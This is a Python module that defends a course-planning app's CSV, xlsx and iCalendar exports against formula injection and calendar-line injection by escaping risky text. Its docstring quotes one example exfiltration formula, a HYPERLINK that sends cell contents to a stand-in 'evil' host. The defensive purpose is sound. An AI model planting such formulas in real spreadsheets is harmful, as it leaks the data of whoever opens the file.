"""Export hardening (review M8): spreadsheet formula injection and iCalendar text injection.

Course names, notes, room labels and instructor names come from uploaded workbooks and free text. A
value such as ``=HYPERLINK("http://evil/?"&A1)`` or ``@SUM(...)`` written into a CSV or an ``.xlsx`` cell is
executed by Excel / LibreOffice when the planner opens the export. Every text value that starts with
``= + - @``, a tab or a carriage return is prefixed with ``'`` (OWASP "CSV injection"): spreadsheets then
show it as text. Numbers, dates and booleans are untouched.
"""

from __future__ import annotations

from collections.abc import Iterable, Mapping
from typing import Any

DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def safe_cell(value: Any) -> Any:
    if isinstance(value, str) and value.startswith(DANGEROUS_PREFIXES):
        return "'" + value
    return value


def safe_row(values: Iterable[Any]) -> list[Any]:
    return [safe_cell(v) for v in values]


def safe_dict(row: Mapping[str, Any]) -> dict[str, Any]:
    return {k: safe_cell(v) for k, v in row.items()}


class _SafeWriter:
    """``csv.writer`` / ``csv.DictWriter`` proxy that quotes formula-like text in every row."""

    def __init__(self, inner: Any) -> None:
        self._inner = inner

    def writerow(self, row: Any) -> Any:
        return self._inner.writerow(safe_dict(row) if isinstance(row, Mapping) else safe_row(row))

    def writerows(self, rows: Iterable[Any]) -> None:
        for r in rows:
            self.writerow(r)

    def __getattr__(self, name: str) -> Any:  # writeheader, dialect, ...
        return getattr(self._inner, name)


def safe_writer(inner: Any) -> Any:
    return _SafeWriter(inner)


def neutralize_workbook(wb: Any) -> int:
    """Make every formula-like text cell of an openpyxl workbook inert (call right before ``save``). openpyxl
    stores a string starting with ``=`` as a *formula*; it is written back as a text cell with Excel's
    quote-prefix flag, so the value is shown verbatim and never evaluated (other text, e.g. ``-``, is
    already inert in .xlsx and keeps its exact value)."""
    n = 0
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for cell in row:
                v = cell.value
                if isinstance(v, str) and (cell.data_type == "f" or v.startswith(DANGEROUS_PREFIXES)):
                    cell.data_type = "s"
                    cell.quotePrefix = True
                    n += 1
    return n


def ics_text(value: Any) -> str:
    """RFC 5545 TEXT escaping; CR/LF never survive (no injected ``ATTENDEE:`` / ``BEGIN:VEVENT`` lines)."""
    s = "" if value is None else str(value)
    s = s.replace("\\", "\\\\").replace(";", "\\;").replace(",", "\\,")
    s = s.replace("\r\n", "\\n").replace("\r", "\\n").replace("\n", "\\n")
    return "".join(ch for ch in s if ch >= " " or ch == "\t")


__all__ = ["ics_text", "neutralize_workbook", "safe_cell", "safe_dict", "safe_row", "safe_writer"]
